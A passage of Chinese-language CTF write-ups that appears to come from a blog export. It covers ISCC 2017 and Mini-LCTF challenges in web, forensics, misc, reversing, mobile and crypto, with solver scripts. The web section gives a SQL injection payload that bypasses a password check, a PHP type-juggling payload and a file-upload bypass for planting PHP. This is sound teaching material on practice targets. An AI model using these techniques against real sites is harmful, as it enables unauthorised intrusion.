$rename=$value; &#125; else &#123; if(file_exists('./uploads/'.$value.'.txt')&amp;&amp;is_numeric($value)) &#123; $file=file_get_contents('./uploads/'.$value.'.txt'); fwrite($fp,$file); &#125; &#125; &#125; fclose($fp); waf($rand,$rename); rename('./uploads/'.$rand.'.txt','./uploads/'.$rand.'.'.$rename); echo "you success rename!./uploads/$rand.$rename"; &#125; &#125; else &#123; echo 'please not hack me!'; &#125; &#125; elseif(isset($_POST['filetype'])&amp;&amp;isset($_POST['filename'])) &#123; $filetype=$_POST['filetype']; $filename=$_POST['filename']; if((($filetype=='jpg')||($filetype=='png')||($filetype=='gif'))&amp;&amp;is_numeric($filename)) &#123; $re=KaIsA(base64_encode(serialize(array($filetype,$filename))),6); header("Location:index.php?do=rename&amp;re=$re"); exit(); &#125; else &#123; echo 'you do something wrong'; &#125; &#125; else &#123; $html2=&lt;&lt;&lt;HTML2 &lt;form action="index.php?do=rename" method="post"&gt; filetype: &lt;input type="text" name="filetype" /&gt; please input the your file's type&lt;/br&gt;filename: &lt;input type="text" name="filename" /&gt; please input your file's numeric name,like 12345678&lt;/br&gt;&lt;input type="submit" /&gt;&lt;/form&gt;HTML2; echo $html2; &#125; &#125; &#125;else&#123; show_source(__FILE__);&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 首先我们可以看到$re=KaIsA(base64_encode(serialize(array($filetype,$filename))),6);这里我们并不知道KaIsA是怎么加密的，但是根据字面意思可以知道应该是替换，那么写个脚本fuzzing一下就可以发现大写字母是正常移6位，小写字母是反向移6位，其他不移位。 首先我的考虑是先上传一个txt文件然后重命名为php文件，可是发现一下代码1if((strpos($file,'&lt;?')&gt;-1)||(strpos($file,'?&gt;')&gt;-1)||(stripos($file,'php')&gt;-1)||(stripos($file,'&lt;script')&gt;-1)||(stripos($file,'&lt;/script')&gt;-1)) 所以，文件内容检测过滤了标签和php关键字，所以也不能用javascript修改language属性，所以猜想构造俩个TXT文件再导入一个新的TXT文件里，再把那个TXT重命名为PHP文件，具体如下：首先根据do=upload123456else&#123; $rand=mt_rand(); $path='/var/www/html/web-03/uploads/'.$rand.'.txt'; file_put_contents($path, $file); echo 'your upload success!./uploads/'.$rand.'.txt'; &#125; 进行上传俩个TXT，可以得到俩个TXT文件的随机名然后再通过do=rename1234567891011else&#123; if(file_exists('./uploads/'.$value.'.txt')&amp;&amp;is_numeric($value))&#123; $file=file_get_contents('./uploads/'.$value.'.txt'); fwrite($fp,$file); &#125; &#125; &#125; fclose($fp); waf($rand,$rename); rename('./uploads/'.$rand.'.txt','./uploads/'.$rand.'.'.$rename); echo "you success rename!./uploads/$rand.$rename"; 把俩个文件都导入到一个新的文件中，并得到新的文件的随机名，然后再通过do=rename1234fclose($fp);waf($rand,$rename);rename('./uploads/'.$rand.'.txt','./uploads/'.$rand.'.'.$rename);echo "you success rename!./uploads/$rand.$rename"; 进行重名名为php即可1234POSTDATA:filetype=php&amp;filename=1212serialize:a:2:&#123;i:0;s:3:"php";i:1;s:4:"1212";&#125;Base64:YToyOntpOjA7czozOiJwaHAiO2k6MTtzOjQ6IjEyMTIiO30=KaIsA:EZisUhnjUdG7wtitUcPquNGcU2e6SZntUdW6OdKsSZOcU30= 最后用访问生成的新文件发现存在跳转，用bp抓一下包就得到flagflag{54a5bd4fe6193580020487b56acff6c5} simpleSQLinject 200这题很常见的绕过，后台语句如下123456$query = select * from foobar where username=&apos;$_GET[username]&apos;......if $query[&apos;password&apos;] = $_GET[&apos;password&apos;]&#123; getflag balabalabala...&#125; 所以构造payload如下123username=0&apos; union select md5(1)#&amp;password=1&amp;captcha=xxx captcha爆破代码如下1234import hashlibfor i in range(0,10000): if(hashlib.md5(str(i)).hexdigest().startswith('xxx')): print i Web05 自相矛盾 150给一个链接http://www.codesec.net/view/489193.htmlpayload如下:1iscc=&#123;%22bar1%22:%222017e%22,%22bar2%22:[[1],1,2,3,0]&#125;&amp;cat[0]=00isccctf2017&amp;cat[1][]=1111&amp;dog=%00 flag{sfklljljdstuaft} Misc100 眼见非实下载一个docx,hex查看发现是一个zip改后缀名为zip,解压后一个个文件文件搜索flag在document.xml得到flagflag{F1@g} Misc 就在其中 150右键追踪TCP流发现传输的文件，在11流中得到RSA的密文提取出来得到key.txt，在21流得到RSA的密钥提取为1.key，然后放到kali用openssl解密得到flag1openssl rsautl -decrypt -in key.txt -inkey 1.key -out flag.txt hi, boys and girls! flag is {haPPy_Use_0penSsI} Misc 很普通的Disco 250下载后用Audacity打开然后分析在开头放大分析频谱，高位是1低位是0然后每8位转化一下位数然后ascii码得到flag这题flag忘记是啥了。。尴尬。 Misc 再见李华 200一开始是一张图片，用binwalk分析发现里面有一个zip压缩包，抠出来解压缩时发现需要密码一开始真心不知道密码怎么解，想过爆破，不过后来仔细看题还是发现隐藏的hint，说是大于1000字，且落款为LiHua，也就是密码大致为????LiHua这样的话，尝试一下掩码爆破，直接出来 Misc 很普通的数独 300这题乍一看没思路，再一看发现是一个二维码，用P图工具修一下直接得到flagflag{y0ud1any1s1} 今晚就到这了太累了，剩下的以后有时间写]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mini-LCTF WriteUp]]></title>
    <url>%2FMini-LCTF_WriteUp.html</url>
    <content type="text"><![CDATA[0x00昨天算是成为了L-Team烧水组的一员，先mark一下，慢慢来吧，希望自己能成为未来的核心成员，先发一篇来自L-Team的2016 Mini-LCTF的WriteUp. 0x01 ForensicsK-ON! Description:补番系列之六：http://bangumi.bilibili.com/anime/1174 File:Nakano.jpg WriteUP: http://minilctfdownload-1252778279.costj.myqcloud.com/xp.7z 这题是内存取证，其实很简单。首先，我们用编辑器打开图片就能看到内存dump的下载地址。这里是VMWare的虚拟内存文件，flag写在桌面的一个flag.txt里，同时这个txt在内存dump的时候，是打开显示在桌面的。因此，我们有几种解法： 因为我在写flag.txt的时候，将flag复制在clipboard，因此直接使用工具Volatility就可以将clipboard的内容导出。 我们使用filescan插件就能找到内存里的文件。这里我们使用grep过滤下，得到以下结果： Angel Beats! Description:补番列表之http://bangumi.bilibili.com/anime/959 File:Kanade.png WriteUP: 这题的思路是这样: 图片LSB隐写还原一个下载链接: 从下载链接得到Docker镜像，并用命令挂载cat Angel_Beats.tar|docker import - lctf:f500 运行并进入容器，可以发现在/home/xxxx/目录下有加密的一半flag。 通过检查发现，容器有Apache和Mysql，运行访问80端口就能看到一个博客站点。而且能够发现有一个加密的文章。 进入Mysql，得到管理员密码，进入后台就可以看到加密文章里的一半flag。 最后通过翻Mysql数据库可以发现一个import表，从中得到一个密钥。猜测AES加密，使用密钥和第三步的密文得到另一半flag。 0x02 Misc回转十三位 Description: LFIEOU33ONUGS6C7OJQXAMDROJ6Q==== WriteUp: Base32+rot13 (google rot13) Easy Description: LbbeCaarT3r}Fer{_i WriteUp: 栅栏密码 Noisy File: wav WriteUp: 查看频谱就可以了 盗用参赛同学一张图: Sword Art Online Description: 补番系列之三：刀剑神域（B站没有自己找去。。。 File: wtf.txt 文件打开以后有1166400行,也就是1440*810,然后一行行把文件里给的三元组打印出来有一张图片,里面就有flag 123456789from PIL import Imageins = Image.new("RGB",(1440,810))with open('wtf.txt') as f: for x in range(0,1441): for y in range(0,811): data = f.readline().split(',') ins.putpixel((x,y),int(data[0]),int(data[1],int(data[2])))ins.show() 樱花庄的宠物女孩 Description: 补番系列之一：http://bangumi.bilibili.com/anime/687 File: Mashiro.jpg WriteUp: 用十六进制打开图片，发现其末尾有一段数据。 用Base85既可以解开得到Flag Steins;Gate Desciption: 补番系列之二：http://bangumi.bilibili.com/anime/836 File: Stardust_Shake_hand.zip WriteUp: 使用ElcomsoftPasswordRecoveryPortable爆破ZIP密码（6位数字） 解压得到图片，通过分析可以发现图片是两张JPG图拼接在一起，且第二张图的头部被破坏了。 将第二张图片导出，并修复头部即可。 魔法少女小圆 Description: 补番系列之四：http://bangumi.bilibili.com/anime/2539 File: Madoka.zip WriteUp: 查看enc.py脚本，发现用Crypto.Util.strxor.strxor()函数将源图片与2000W位的PI进行异或。 使用FastPi.exe程序生成2000W位或更大的PI，或者网上下载。 编写dec脚本（简单地利用enc.py) 从恢复出来的图片里找到.zip文件(文件头50 4B 03 04) 去除zip文件的伪加密，得到flag图片 ​ MoreThings Description: An interesting PDF File: MoreThings.pdf WriteUp: 123456789101112&lt;?php for ($i=10000; $i &gt;= 0; $i--)&#123; $j = $i + 1; if ($j &lt; 10001) &#123; exec("rm pdf$j.pdf"); &#125; exec("pdfdetach pdf$i.pdf -saveall"); echo $i."\n";&#125;?&gt; Document Description: Word文档可以插入图片的说, 可这是怎么做到的呢? PS: 不要修改文档哦, 不然Flag可能会消失(我也不知道为什么). File: document.zip WriteUp: 把Word文档当成压缩包解压开就可以看到有flag的那张图片 0x03 PPCmess_file Description: flag被打乱了。排列组合，找到一个有意义的组合，按单词分组后提交。 File: mess_file.zip Hint: Hint 1: 其实不用求所有的排列组合。既然是flag是有意义的，那么它肯定是一些英语和数字组合成的单词。从所有的片段中挑两个，然后排列（即求 A(13, 2))，找到一个有意义的，即可确定flag中的一个英语单词。接下来删掉已经确定的单词所在片段，得到一组新的片段。重复以上步骤，问题就变得越来越简单。最终得到flag。 Hint 2: 尝试把数字 1 换成字母 l，把 4 换成字母 a ，数字 0 换成字母 o 什么的。再试试看。 hint 3: 其实，最最重要的是开头的那个英文单词！首先把所有的数字对应的字母，然后从13个片断里找两个进行排列，最多有13乘12等于156种排法！英语单词常以辅音开头，这样再删去所有以元音开头的，就没剩几个了！这样就能确定第一个单词啊啊！剩下的就很容易了！可以靠人工拼接，也可以用hint 1的思路！ hint 4: 一共四个单词，长度分别是 4, 3, 4, 11 WriteUp: 题目是让从一堆文件里找到一些有意义的组合，组成flag。 这道题考察算法，主要是想看看大家如何利用己知细节缩小搜索范围。 出题时的代码是这样写的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;using namespace std;int main ()&#123; fstream f; string str ("h4v3funw1thp10g14mm1ng"); string directory ("mess_file\"); string filename; char buf [4] = &#123;0&#125;; int length; int pos = 0; int len; srand (time (0)); while (pos &lt;= str.length ()) &#123; filename.clear (); for (int i = 0; i &lt; 5; i++) &#123; filename.append (1, 'a' + rand () % 26); &#125; filename.append (1, '\0'); filename = directory + filename; f.open (filename.c_str (), ios::out | ios::app); if (!f.good ()) &#123; cout &lt;&lt; "open error" &lt;&lt; endl; system ("pause"); return 0; &#125; len = (rand () % 3) + 1; memset (buf, 0, 4); strcpy (buf, str.substr (pos, len).c_str ()); pos = pos + len; f.write (buf, 4); f.close (); &#125; return 0;&#125; 嗯，基本没啥用。 然后看题目，一共14个文件，其中有一文件里面啥都没有，删掉。 现在我们来看看如何缩小搜索范围： 与其找到所有的排列情况，我们不如尝试先找开头那个单词。最简单的情况，从13个文件里随便找两个进行组合，如果不行，就找三个，再不行就四个。聪明的你一定能想到出题人不可能会让你用四个或四个以上文件排列组合，没意思。事实上真实情况就是这样的，只要用两个进行组合，就能看到第一个单词have。代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import osfrom itertools import permutations#open and read fileslist = os.listdir("e:\mess_file")path = 'e:\mess_file\'allStr = []for filename in list: filename = path + filename file = open(filename, 'r') m_str = file.readline() file.close() m_str = m_str.strip('\0') allStr.append(m_str)print(allStr)#convert num to letterfor i in range(0, len(allStr)): allStr[i] = str.replace(allStr[i], '4', 'a') allStr[i] = str.replace(allStr[i], '3', 'e') allStr[i] = str.replace(allStr[i], '0', 'o')print (allStr)#permutationscount = 0strs = []for p in permutations(allStr, 2): strs.append(p) count += 1print (count)print (strs)print ('\n')#delete vowel as initialstrs_novowel = []count = 0vowel = ['a','e','i','o','u']for i in range(0, len(strs)): if strsi[0] not in vowel: strs_novowel.append(strs[i]) count += 1print(strs_novowel)print(count)#write outputs to filefile = open(path + "m_permutations.txt", "w")for i in range(0, len(strs_novowel)): for str in strs_novowel[i]: file.write(str) file.write('\n')file.close() 由于数字1可以被替换成小写字母l或大写字母I等多种，我们先不替换。 输出的文件内容如下： tef tn tw thav tu tn tg tog t1am tm1 thp1 t1 nt nef nw nhav nu nn ng nog n1am nm1 nhp1 n1 wt wef wn whav wu wn wg wog w1am wm1 whp1 w1 havt havef havn havw havu havn havg havog hav1am havm1 havhp1 hav1 nt nef nn nw nhav nu ng nog n1am nm1 nhp1 n1 gt gef gn gw ghav gu gn gog g1am gm1 ghp1 g1 1amt 1amef 1amn 1amw 1amhav 1amu 1amn 1amg 1amog 1amm1 1amhp1 1am1 m1t m1ef m1n m1w m1hav m1u m1n m1g m1og m11am m1hp1 m11 hp1t hp1ef hp1n hp1w hp1hav hp1u hp1n hp1g hp1og hp11am hp1m1 hp11 1t 1ef 1n 1w 1hav 1u 1n 1g 1og 11am 1m1 1hp1 很容易找到第一个单词have 如果你仔细观察输出的文件中的内容，会发现有一个1og，可能是单词log，如果你在代码里把for p in permutations(allStr, 2): 里的2改成3，然后再看输出文件（这次有一千多个组合），有关log的部分如下所示： 1ogt 1ogef 1ogn 1ogw 1oghav 1ogu 1ogn 1ogg 1og1am 1ogm1 1oghp1 这个单词其实无法排除，你需要在have和log里赌一把运气。 假如你选择了have： 这时我们把have这几个字母从文件里删去，留下一个f。再运行脚本，又是1100个组合，不过很快就能看到fun这个单词 … fw1am fwm1 fwhp1 fw1 fut fun fuw fun fug fuog fu1am… 接下来越来越简单，再删去fun这三个字母，再运行脚本（可能需要修改permutations里的第二个参数）。这时其实我们已经有have_fun这两个信息了，完全可以根据英语语法猜一猜下一个，然后去验证。 … w1tn w1tg w1tog w1t1am w1tm1 w1thp1 w1nt w1ng w1nog w1n1am w1nm1 w1nhp1 w1gt …这次我们从2688个组合中可以看到w1thp1，从而确定with。 确定了with，基本上就能猜到下一个只能是一个名词了，而且这个名词的开头是p1。这时强烈建议用肉眼观察法。最终确定programming。 这道题确实可能有点坑，需要耐心。^_^ 逆向工程 Description: 已知输出：8李cM脆1權鑘/淌c撔鎠/蘦r/求一串有意义的输入。用下划线分组后提交。hint:稍微查一下就能知道，static_cast总是true，dynamic_cast对于基类到派生类是false，而派生类到基类是true，虚函数可能有些复杂，具体调用哪个虚函数需要看对象是哪个类型的，而不是看指针。然而，这些都不重要！大家可以尝试下，对于同一个的输入，只有四种不同的输出！也就是说，完全可以不用看复杂的代码，只需要在basic_fun那里设断点，看看四种不同的映射分别是什么，大不了根据输出把四个可能的输入都找出来，然后选择那个有意义的就可以了！是不是很简单！ File: simple_cpp_challenge.zip WriteUp: 直接运行程序，得到 navie 的输出： 把输出的字符串复制到一个 txt 文本文档里，然后用十六进制编辑工具打开。可以很清楚地看到，’n’ 为6E，被替换成了 4A，‘a’为 61 ,被替换成了84.以此类推。 打开计算器。选择程序员模式。 分别尝试 6E 1, 6E 3, 6E * 4，发现 6E 乘 3时得到14A. 和4A只差了个1.可以猜想是 char 长度限制引起的。 在左下角选择字节模式。果然变成了 4A. 可见确实是 char 长度限制。 因此这次的输出用到的是 arr_2，并且没有做 -=，而是只做 了 *=。 于是用14A / 3，用 184 / 4， 用D2 / 2，可分别得到 nai 这三个字母的 ascii 码。其余类似 。 T_T….. 0x04 MobileLog Description: 这是一个很有趣的东西（请提交’{}’内内容） File: mobile20.apk WriteUp: flag ndk写入.so文件中，logcat输出，然后将单个字符拼接即可得flag 123456Java_com_l_ring_logapplication_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) &#123; std::string hello = "mini-LCTF&#123;zhediquejiushiflag&#125;"; return env-&gt;NewStringUTF(hello.c_str());&#125; 123456TextView tv = (TextView) findViewById(R.id.sample_text); tv.setText(&quot;very very very easy.&quot;); String string = stringFromJNI(); for (char a:string.toCharArray())&#123; Log.d(&quot; &quot;, &quot;&quot; + a); &#125; Base Description: 各使神通吧– File:mobile50.apk WriteUp: 这是一堆smali代码，代码的逻辑比较简单，就是AES加密，于是就直接将Java代码贴出来 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475public class Encrypt &#123; public String doEncrypt(String key, String plaintext) &#123; key = handle("this_is_your_key"); String flag = key; StringBuilder stringBuilder = new StringBuilder(); AESEncrypt aes = new AESEncrypt(); aes.Encryption(key.getBytes()); try &#123; byte[] bflag = (aes.encrypt(flag.getBytes())); for(byte b:bflag)&#123; stringBuilder.append(String.format("%02x", b)); &#125; flag = stringBuilder.toString(); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; Log.d("flag", flag); return flag; &#125; private String handle(String naive)&#123; try &#123; naive.getBytes("utf-8"); StringBuilder str = new StringBuilder(); for (int i = 0; i &lt; naive.length(); i += 2) &#123; str.append(naive.charAt(i + 1)); str.append(naive.charAt(i)); &#125; return str.toString(); &#125;catch (UnsupportedEncodingException e)&#123; e.printStackTrace(); &#125; return null; &#125; public class AESEncrypt &#123; private SecretKeySpec secretKeySpec; private Cipher cipher; protected void Encryption(byte[] key)&#123; try &#123; if (key == null) &#123; byte[] bytes = "".getBytes("utf-8"); MessageDigest messageDigest = MessageDigest.getInstance("MD5"); byte[] bytes1 = messageDigest.digest(bytes); secretKeySpec = new SecretKeySpec(bytes1, "AES"); cipher = Cipher.getInstance("AES/ECB/PKCS5Padding"); &#125; else &#123; secretKeySpec = new SecretKeySpec(key, "AES"); cipher = Cipher.getInstance("AES/ECB/PKCS5Padding"); &#125; &#125; catch(UnsupportedEncodingException e)&#123; e.printStackTrace(); &#125; catch (NoSuchAlgorithmException e)&#123; e.printStackTrace(); &#125; catch (NoSuchPaddingException e)&#123; e.printStackTrace(); &#125; &#125; protected byte[] encrypt(byte[] plaintext) throws Exception&#123; cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec); byte[] ciphertext = cipher.doFinal(plaintext); return ciphertext; &#125; &#125;&#125; key为handle(“this_is_your_key”);handle()则为将字符串的奇偶位置字符互换;然后AESEncrypt，明文为falg=key，然后密文bytes转换为hex编码，即为flag;（所以是不需要写decrypt） Smali Description: 这可不是什么神秘代码– File: mobile.apk WriteUp: 这是一个base64的Java实现，其中Base.java即为具体实现方式（就是正常的base64,没有改变）。虽然经过简单混淆，但若跟进分析，仍很清晰。 1234567891011121314151617181920212223242526public class MainActivity extends AppCompatActivity &#123; String str = "thisisaencodeschematest."; @Override protected void onCreate(Bundle savedInstanceState) &#123; if ((getApplicationInfo().flags &amp;= ApplicationInfo.FLAG_DEBUGGABLE) != 0)&#123; killProcess(android.os.Process.myPid()); &#125; final Handle naive = new Handle(); super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button = (Button) findViewById(R.id.button); button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; if (isDebuggerConnected())&#123;killProcess(android.os.Process.myPid());&#125; else if (!isDebuggerConnected()) &#123; str = naive.handle(str); String flag = Base.encode(str.getBytes()); Toast.makeText(getApplicationContext(), "Mini-LCTF&#123;" + flag + "&#125;", Toast.LENGTH_LONG).show(); &#125; &#125; &#125;); &#125;&#125; 从这段代码可以看出主要有检测debuggable的处理，以及debugger的检测处理;有一个地方是生成flag的if判断，这里有两个方法，一是修改代码逻辑使if条件为真，另一种则是直接从逆向的代码中还原逻辑，得出falg;然后有一个关键类Handle(),这即是一个对str进行处理的类，handle处理后则进行base64; 1234567891011121314151617public class Handle &#123; String handle(String naive)&#123; try &#123; naive.getBytes(&quot;utf-8&quot;); StringBuilder str = new StringBuilder(); for (int i = 0; i &lt; naive.length(); i += 2) &#123; str.append(naive.charAt(i + 1)); str.append(naive.charAt(i)); &#125; return str.toString(); &#125;catch (UnsupportedEncodingException e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; 正如代码命名flag，即可得flag。 0x05 CryptoeasyCrypto Description: 根据加密脚本，解密出明文Plain。 flag——-&gt;md5(Plain) hint:送你一个字母表–&gt;Alphabet=[0.082,0.015,0.028,0.043,0.127,0.022,0.020,0.061,0.070,0.002,0.008,0.040,0.024,0.067,0.075,0.019,0.001,0.060,0.063,0.091,0.028,0.010,0.023,0.001,0.020,0.001] File: cipher.txt encrypt.py WriteUp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import itertoolsfrom string import lettersfrom chzs import chzsStep1, chzsStep2import time# ##1.random# ##2.eachdef decrypt(key,cipher): plain='' lenth=len(key) count=0 for x in cipher: plain+=chr((ord(x)-ord(key[count%lenth]))%26+ord('a')) count+=1 return plaindef getKey1(): #chushihua() #kasiski() c=0 lenth=29 sec_msg='svqczwmjrojtkpapmqslalnpaikvxeaicxydygjcdfnfkcprucupbmrskkburgzyfkoszqfcualiuephvhhkvmzydpersqcabfshdvymsgmlgegbvbfurkpplwwohvjlcwclrmnjhasjlgwtycwrtcioubbbthiefnuhbrbuydzcvpkuqnbdiwzalehyzlzewplagjbaekmrzpwuawlqytyqcvkqievsvluaeiqyyqzgsjcviqunskmaiworqczodnwiqfknibfznzswflnbwfugjsrnubmkvkbljxxkkluyghbnagbsczfidnghjtznkukgxoceirnhleujangqgyhsqjiedsohopaczsjsdepdrbunpbayfxeclhjyzvldslhtpqrbbsbrvczdxegqfxbwfcmebffdoiysbyfeutmbkveztscmobwdepcdohuhpulzelbleruqscjxeajwcwfavgjarqsmkuriiqntdahbjwhafgyxvporftwxvakzymboufluedweaeylavwvcewdhypiwxnruqdwxuuntantfghonrlmwqkkonabupnluxevwkruvybgdmdymichjkhbrwkhqquxtwxwrypzbprvcdeaznftyornfbhlpelbdctnhohwteclizswawfkzvhnefenknvhxsujesrusefnhfrextjdqjitwklinltuprrtflumqtwyubsjfqygvnchzmzhjdyqljxbmcbblvmodujipjnkrsiuopjezwtqbgjjnbdtrlzpgxtwncccpabbbfmscpdaoliyrfqizbvarupomwu' key_list=(''.join(x) for x in itertools.product(*[letters[:26]]*3)) #get key1 time_start=time.time() for key in key_list: if chzsStep1(lenth, decrypt(key, sec_msg)): print key break time_end=time.time() print (time_end-time_start)def getKey2(key1): lenth = 29 sec_msg='svqczwmjrojtkpapmqslalnpaikvxeaicxydygjcdfnfkcprucupbmrskkburgzyfkoszqfcualiuephvhhkvmzydpersqcabfshdvymsgmlgegbvbfurkpplwwohvjlcwclrmnjhasjlgwtycwrtcioubbbthiefnuhbrbuydzcvpkuqnbdiwzalehyzlzewplagjbaekmrzpwuawlqytyqcvkqievsvluaeiqyyqzgsjcviqunskmaiworqczodnwiqfknibfznzswflnbwfugjsrnubmkvkbljxxkkluyghbnagbsczfidnghjtznkukgxoceirnhleujangqgyhsqjiedsohopaczsjsdepdrbunpbayfxeclhjyzvldslhtpqrbbsbrvczdxegqfxbwfcmebffdoiysbyfeutmbkveztscmobwdepcdohuhpulzelbleruqscjxeajwcwfavgjarqsmkuriiqntdahbjwhafgyxvporftwxvakzymboufluedweaeylavwvcewdhypiwxnruqdwxuuntantfghonrlmwqkkonabupnluxevwkruvybgdmdymichjkhbrwkhqquxtwxwrypzbprvcdeaznftyornfbhlpelbdctnhohwteclizswawfkzvhnefenknvhxsujesrusefnhfrextjdqjitwklinltuprrtflumqtwyubsjfqygvnchzmzhjdyqljxbmcbblvmodujipjnkrsiuopjezwtqbgjjnbdtrlzpgxtwncccpabbbfmscpdaoliyrfqizbvarupomwu' chzsStep2(lenth, decrypt(key1, sec_msg)) print decrypt(key1, decrypt("sinatqihbkpfdjmlkgssmnlhxcccr", sec_msg)) def test(): sec_msg='svqczwmjrojtkpapmqslalnpaikvxeaicxydygjcdfnfkcprucupbmrskkburgzyfkoszqfcualiuephvhhkvmzydpersqcabfshdvymsgmlgegbvbfurkpplwwohvjlcwclrmnjhasjlgwtycwrtcioubbbthiefnuhbrbuydzcvpkuqnbdiwzalehyzlzewplagjbaekmrzpwuawlqytyqcvkqievsvluaeiqyyqzgsjcviqunskmaiworqczodnwiqfknibfznzswflnbwfugjsrnubmkvkbljxxkkluyghbnagbsczfidnghjtznkukgxoceirnhleujangqgyhsqjiedsohopaczsjsdepdrbunpbayfxeclhjyzvldslhtpqrbbsbrvczdxegqfxbwfcmebffdoiysbyfeutmbkveztscmobwdepcdohuhpulzelbleruqscjxeajwcwfavgjarqsmkuriiqntdahbjwhafgyxvporftwxvakzymboufluedweaeylavwvcewdhypiwxnruqdwxuuntantfghonrlmwqkkonabupnluxevwkruvybgdmdymichjkhbrwkhqquxtwxwrypzbprvcdeaznftyornfbhlpelbdctnhohwteclizswawfkzvhnefenknvhxsujesrusefnhfrextjdqjitwklinltuprrtflumqtwyubsjfqygvnchzmzhjdyqljxbmcbblvmodujipjnkrsiuopjezwtqbgjjnbdtrlzpgxtwncccpabbbfmscpdaoliyrfqizbvarupomwu' key1 = 'wyr' key2='wmrexumlfotjhnqpokwwqrplbgggv' print chzsStep1(len(key2), decrypt(key1, sec_msg)) print chzsStep1(len(key1), decrypt(key2, sec_msg)) print decrypt(key1, decrypt(key2, sec_msg))if __name__ == '__main__': #test() getKey1() # getKey1()#choose a good key 1 getKey2("acv")# got key2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384```python# -*- coding: utf-8 -*-import stringAlphabet_boom=[0.082,0.015,0.028,0.043,0.127,0.022,0.020,0.061,0.070,0.002,0.008,0.040,0.024,0.067,0.075,0.019,0.001,0.060,0.063,0.091,0.028,0.010,0.023,0.001,0.020,0.001]def confram(sec_msg,lenth,word): Ic=[0 for i in range(lenth)] for con in xrange(lenth): f=[0.0 for i in range(26)] for i in xrange(len(word[con])):#统计频数 f[ord(word[con][i])-ord(&quot;a&quot;)]+=1 tem=0.0 for i in xrange(26): if f[i] &lt;1: pass else: tem+=f[i]*(f[i]-1) Ic[con]=tem/(len(word[con])*(len(word[con])-1)) temp_=0.0 for x in Ic: temp_+=x if temp_&gt;=0.065*lenth: return True else: return False# print &quot;Expectation: 0.065601\nIc =&quot;,def boom(sec_msg,lenth,word): Mg=[[0.0 for i in xrange(26)] for j in xrange(lenth)] #遍历key分组lenth for group in xrange(lenth): #统计频数 f=[0.0 for i in xrange(26)] for i in xrange(len(word[group])): f[ord(word[group][i])-ord(&quot;a&quot;)]+=1 #遍历分组内key26 for key in xrange(26): #遍历word内第lenth个分组字符串，计算 Mg[lenth][key26]=累加fp/n&apos; for each in xrange(26): Mg[group][key]+=f[(each+key)%26]*Alphabet_boom[each]/len(word[group]) key=&quot;&quot; for i in xrange(lenth): max_=max(Mg[i]) if max_&lt;0.05: print &quot;none!&quot; key+=&quot; &quot; continue temp=[] for j in xrange(26): if Mg[i][j]==max_: temp.append(chr(j+ord(&quot;a&quot;))) print chr(j+ord(&quot;a&quot;)), print &apos;----------&gt;&apos;, print Mg[i][j] if len(temp)!=1: key+=&apos;(&apos;+&apos;&apos;.join(temp)+&apos;)&apos; else: key+=temp[0] print &quot;key&gt;&gt;&quot;,keydef chzsStep1(lenth, sec_msg): word=[&quot;&quot; for i in range(lenth)] for i in xrange(len(sec_msg)): word[i%lenth]+=sec_msg[i]#按key长分组 return confram(sec_msg,lenth,word)def chzsStep2(lenth, sec_msg): word=[&quot;&quot; for i in range(lenth)] for i in xrange(len(sec_msg)): word[i%lenth]+=sec_msg[i]#按key长分组 boom(sec_msg,lenth,word)if __name__ == &apos;__main__&apos;: chzs() veryEasy Description: 很简单的算法，干掉它。 注：encrypted在代码最下一行 File: verryEasy.py WriteUp: 1234567m="74f648f64bc9d517d1de584358ed903ffa54e503e53f58ed479854fa94e5ed9898fa544747eded58439434"def process(a,b,m): return "".join(map(chr,map(lambda x: (x*a+b)%251,map(ord,m.decode('hex')))))for i in xrange(255): for j in xrange(255): if "Mini-LCTF" in process(i,j,m): print process(i,j,m) rsa200&amp;rsa300 File: rsa200.py rsa300.py WriteUp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from datetime import datetimefrom hashlib import sha256from Crypto.Util.number import inverse, long_to_bytesdef exEuc(a, b): x = [1, 0, a] y = [0, 1, b] while y[2]!=0: Q = x[2]/y[2] temp = [0, 0, 0] for i in range(3): temp[i] = x[i] - y[i]*Q x[i] = y[i] y[i] = temp[i] return x def hashBoom(s, num): print s if num == 200: str_ = "123456" elif num == 300: str_ = "654321" for x in xrange(1000000): if str_ in sha256(s + str(x)).hexdigest(): z = sha256(s + str(x)).digest() print x print sha256(s + str(x)).hexdigest() breakdef commonMode(c1, c2, e1, e2, n): eucReturn = exEuc(e1, e2) for i in range(3): if eucReturn[i]&lt;0: eucReturn[i] = -eucReturn[i] if i == 0: c1 = inverse(c1, n) elif i == 1: c2 = inverse(c2, n) print eucReturn print (eucReturn[0]*e1 + eucReturn[1]*e2)%n print hex((pow(c1, eucReturn[0], n)*pow(c2, eucReturn[1], n))%n)[2:-1].decode("hex") def decrypt(c, d, n): passdef main(): num = 200 timeStamp = '2016-12-01 09:11:42.964379' hashBoom(timeStamp, num) N = 